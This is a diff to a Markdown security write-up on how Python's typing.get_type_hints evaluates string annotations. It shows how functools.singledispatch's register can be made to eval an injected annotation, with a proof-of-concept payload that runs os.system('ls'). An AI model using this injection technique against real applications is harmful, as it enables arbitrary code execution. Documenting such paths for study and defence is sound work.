@@ -170,7 +170,55 @@ print(typing.get_type_hints(p))
 
 Here, we specify a forward reference which imports `os` and calls `os.system`
 
-It is possible that `typing.get_type_hints` is used internally by other Python functions, which could make these functions also susceptible to similar misuse. For example, the Stack Overflow post mentions `functools.singledispatch` which has inner function `register`.
+It is possible that `typing.get_type_hints` is used internally by other Python functions, which could make these functions also susceptible to similar misuse. The Stack Overflow post mentions `functools.singledispatch` which has inner function `register`. The `register` function calls `typing.get_type_hints`. In the `register` function, `typing.get_type_hints` is used like this
+
+```Python
+def register(cls, func=None):
+        nonlocal cache_token
+        if _is_valid_dispatch_type(cls):
+            if func is None:
+                return lambda f: register(cls, f)
+        else:
+            if func is not None:
+                raise TypeError(
+                    f"Invalid first argument to `register()`. "
+                    f"{cls!r} is not a class or union type."
+                )
+            ann = getattr(cls, '__annotate__', None)
+            if ann is None:
+                raise TypeError(
+                    f"Invalid first argument to `register()`: {cls!r}. "
+                    f"Use either `@register(some_class)` or plain `@register` "
+                    f"on an annotated function."
+                )
+            func = cls
+
+            # only import typing if annotation parsing is necessary
+            from typing import get_type_hints
+            from annotationlib import Format, ForwardRef
+            argname, cls = next(iter(get_type_hints(func, format=Format.FORWARDREF).items()))
+```
+
+To reach the `get_type_hints` call, the function must be registered in such a way that the execution reaches the `else` block. This happens if we use `@register` on an annotated function. We can add additional annotations to the function before calling register. If we add annotations like in the example to the function, we can get code execution.
+
+```Python
+from functools import singledispatch
+
+
+def handle_payload(p: "Payload"): # annotated function
+    print(f"Processing Payload: {p}")
+
+handle_payload.__annotations__ = {
+    "obj": """eval('__import__("os").system("ls")')"""
+}
+
+@singledispatch
+def process(obj):
+    print("Default processing")
+
+process.register(handle_payload)
+```
+There will be a `TypeError: Invalid annotation for 'x'. 0 is not a class` when running this, but that happens after the `eval` is executed (and frankly, executing the `eval` is what we care about).
 
 ***
 
